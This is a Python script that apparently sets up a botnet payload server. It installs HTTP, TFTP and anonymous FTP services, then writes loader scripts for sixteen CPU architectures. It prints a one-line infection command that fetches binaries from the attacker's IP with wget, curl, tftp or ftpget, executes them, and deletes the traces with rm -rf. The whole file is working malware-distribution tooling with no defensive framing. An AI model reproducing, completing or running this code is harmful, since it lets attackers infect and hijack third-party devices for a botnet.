import subprocess, sys, urllib
ip = urllib.urlopen('http://api.ipify.org').read()
exec_bin = "prison"
exec_name = "ssh.exploit"
bin_prefix = "1isequal9."
bin_directory = "Please-Subscribe-To-My-YT-Channel-VegaSec"
archs = [
"x86",                        #1
"mips",                       #2
"mpsl",                       #4
"arm",                        #5
"arm5",                       #6
"arm6",                       #7
"arm7",                       #9
"ppc",                        #10
"m68k",                       #12
"sh4",                        #13
"spc",                        #14
"arc",                        #15
"x86_64",                     #16
"i686",                       #17
"i486",                       #18
"i586"                        #19
]                        

def run(cmd):
    subprocess.call(cmd, shell=True)

print("Setting up Apache2 TFTP and FTP for your payload")
print(" ")

run("yum install httpd -y &> /dev/null")
run("service httpd start &> /dev/null")
run("yum install xinetd tftp tftp-hpa -y &> /dev/null")
run("yum install vsftpd -y &> /dev/null")
run("service vsftpd restart &> /dev/null")

run('''echo "service tftp
{
    socket_type             = dgram
    protocol                = udp
    wait                    = yes
    user                    = root
    server                  = /usr/sbin/in.tftpd
    server_args             = -s -c /var/lib/tftpboot
    disable                 = no
    per_source              = 11
    cps                     = 100 2
    flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')  
run("service xinetd start &> /dev/null")
run('''echo "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd-anon.conf''')
run("service vsftpd restart &> /dev/null")
run("service xinetd restart &> /dev/null")
print("Creating .sh payload")
print(" ")
run('echo "#!/bin/bash" > /var/lib/tftpboot/grilling.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/grilling.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/grilling.sh')

run('echo "#!/bin/bash" > /var/lib/tftpboot/grilling2.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/grilling2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/grilling2.sh')

run('echo "#!/bin/bash" > /var/ftp/grilling1.sh')
run('echo "ulimit -n 1024" >> /var/ftp/grilling1.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/ftp/grilling1.sh')
run('echo "#!/bin/bash" > /var/www/html/grilling.sh')


for i in archs:
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/www/html/grilling.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' '+bin_prefix+i+' '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/ftp/grilling1.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/lib/tftpboot/grilling.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r '+bin_prefix+i+' -g ' + ip + ';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/lib/tftpboot/grilling2.sh')    
run("service xinetd restart &> /dev/null")
run("service httpd restart &> /dev/null")

print("\x1b[0;32mPayload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/grilling.sh; curl -O http://" + ip + "/grilling.sh; chmod 777 grilling.sh; sh grilling.sh; tftp " + ip + " -c get grilling.sh; chmod 777 grilling.sh; sh grilling.sh; tftp -r grilling2.sh -g " + ip + "; chmod 777 grilling2.sh; sh grilling2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " grilling1.sh grilling1.sh; sh grilling1.sh; rm -rf grilling.sh grilling.sh grilling2.sh grilling1.sh; rm -rf *\x1b[0m")

print("Copied to /var/www/html/Please-Subscribe-To-My-YT-Channel-VegaSec.sh")
complete_payload = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/grilling.sh; curl -O http://" + ip + "/grilling.sh; chmod 777 grilling.sh; sh grilling.sh; tftp " + ip + " -c get grilling.sh; chmod 777 grilling.sh; sh grilling.sh; tftp -r grilling2.sh -g " + ip + "; chmod 777 grilling2.sh; sh grilling2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " grilling1.sh grilling1.sh; sh grilling1.sh; rm -rf grilling.sh grilling.sh grilling2.sh grilling1.sh; rm -rf *"
file = open("payload.txt","w+")
file.write(complete_payload)
file.close()
exit()
raw_input("\033[01;37mYour payload has been generated and saved in payload.txt\033[0m")